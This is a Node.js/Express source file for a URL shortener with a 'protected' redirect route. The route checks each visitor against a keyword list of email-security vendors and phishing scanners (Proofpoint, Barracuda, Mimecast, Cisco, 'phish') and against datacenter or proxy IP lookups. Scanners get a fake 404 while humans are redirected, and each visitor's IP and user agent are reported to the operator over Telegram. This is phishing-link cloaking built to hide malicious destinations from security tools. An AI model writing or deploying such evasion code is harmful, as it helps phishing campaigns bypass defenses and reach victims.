import express from 'express';
import useragent from 'express-useragent';
import axios from 'axios';
import mongoose from 'mongoose';

const app = express();
app.use(useragent.express());
const PORT = process.env.PORT || 3000;

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('📁 Connected to MongoDB successfully!'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// 📝 Schema definition
const linkSchema = new mongoose.Schema({
    slug: { type: String, required: true, unique: true },
    realUrl: { type: String, required: true },
    clicks: { type: Number, default: 0 }
});

const Link = mongoose.model('Link', linkSchema);

// 🔍 Helper: Check if visitor is a Bot, Scanner, or Datacenter IP
async function isBotOrProxy(visitorIp, reqUserAgent, rawAgentString = '') {
    const agentLower = rawAgentString.toLowerCase();

    // 1. Fast Check: User-Agent Inspection
    const botKeywords = [
        'bot', 'crawler', 'spider', 'headless', 'python', 'curl', 'wget', 
        'postman', 'comcast', 'proofpoint', 'barracuda', 'cisco', 'mimecast', 
        'phish', 'scanner', 'facebookexternalhit', 'telegrambot', 'twitterbot'
    ];

    if (reqUserAgent.isBot || botKeywords.some(keyword => agentLower.includes(keyword))) {
        return { isBot: true, reason: 'Suspicious User-Agent / Known Crawler' };
    }

    // Handle local IP addresses during development
    if (visitorIp === '127.0.0.1' || visitorIp === '::1' || visitorIp.startsWith('192.168.')) {
        return { isBot: false, reason: 'Local Development Traffic' };
    }

    // 2. Deep Check: IP Intelligence API (Checks for Datacenters, VPNs & Proxies)
    try {
        const response = await axios.get(`http://ip-api.com/json/${visitorIp}?fields=status,hosting,proxy,org,isp`, { timeout: 3000 });
        if (response.data && response.data.status === 'success') {
            const { hosting, proxy, org, isp } = response.data;
            
            // If traffic originates from a cloud provider/datacenter or proxy
            if (hosting || proxy) {
                return { isBot: true, reason: `Datacenter/Proxy IP (${org || isp || 'Cloud Provider'})` };
            }
        }
    } catch (error) {
        console.error('IP API lookup failed (allowing request by default):', error.message);
    }

    return { isBot: false, reason: 'Human Traffic' };
}

// ✂️ Shorten Link Route
app.get('/shorten', async (req, res) => {
    const slug = req.query.slug;
    const url = req.query.url;

    if (!slug || !url) {
        return res.status(400).send('Error: Please provide both ?slug= and ?url=');
    }

    try {
        await Link.findOneAndUpdate(
            { slug: slug }, 
            { realUrl: url, clicks: 0 }, 
            { upsert: true, new: true }
        );

        const host = req.get('host');
        const protocol = req.protocol;
        
        res.send(`Success! Short link created: ${protocol}://${host}/${slug}`);
    } catch (error) {
        console.error('❌ Error saving link to database:', error);
        res.status(500).send('Internal Server Error');
    }
});

// 🧭 The Redirect Route (Protected by Anti-Bot)
app.get('/:slug', async (req, res) => {
    const slug = req.params.slug;

    try {
        const linkData = await Link.findOne({ slug: slug });

        if (!linkData) {
            return res.status(404).send('Link not found!');
        }

        // Extract Visitor IP and User-Agent
        const forwardedIps = req.headers['x-forwarded-for'];
        const visitorIp = forwardedIps ? forwardedIps.split(',')[0].trim() : req.socket.remoteAddress;
        const visitorAgent = req.headers['user-agent'] || 'Unknown';

        // 🛡️ Run Anti-Bot & Scanner Check
        const botStatus = await isBotOrProxy(visitorIp, req.useragent, visitorAgent);

        if (botStatus.isBot) {
            console.log(`🤖 BOT BLOCKED [/${slug}]: ${visitorIp} - Reason: ${botStatus.reason}`);
            
            // Notify Telegram about the blocked bot without incrementing database click counts
            sendTelegramAlert(slug, visitorIp, visitorAgent, linkData.clicks, true, botStatus.reason);
            
            // Return 404 or blank response to confuse the bot/scanner
            return res.status(404).send('Not Found');
        }

        // 👤 Genuine Human Visitor
        linkData.clicks++;
        await linkData.save();

        // Send Telegram alert for human click
        sendTelegramAlert(slug, visitorIp, visitorAgent, linkData.clicks, false); 

        // Execute instant redirect
        return res.redirect(linkData.realUrl);

    } catch (error) {
        console.error('Error handling redirect:', error);
        res.status(500).send('Internal Server Error');
    }
});

// 📢 Telegram Notification Function
async function sendTelegramAlert(slug, visitorIp, visitorAgent, clickCount, isBot = false, botReason = '') {
    const token = process.env.TELEGRAM_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) return;
    
    let message = '';

    if (isBot) {
        message = `🤖 *BOT / SCANNER BLOCKED!*\n\n` +
                  `🔗 *Link:* /${slug}\n` +
                  `🚫 *Reason:* ${botReason}\n` +
                  `🌐 *IP Address:* ${visitorIp}\n` +
                  `📱 *User Agent:* \`${visitorAgent}\``;
    } else {
        message = `🚨 *Human Link Clicked!*\n\n` +
                  `🔗 *Link:* /${slug}\n` +
                  `🔢 *Total Human Clicks:* ${clickCount}\n` +
                  `🌐 *IP Address:* ${visitorIp}\n` +
                  `📱 *User Agent:* \`${visitorAgent}\``;
    }

    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    
    try {
        await axios.post(telegramUrl, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error('Telegram notification failed:', error.message);
    }
}

// Start Server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});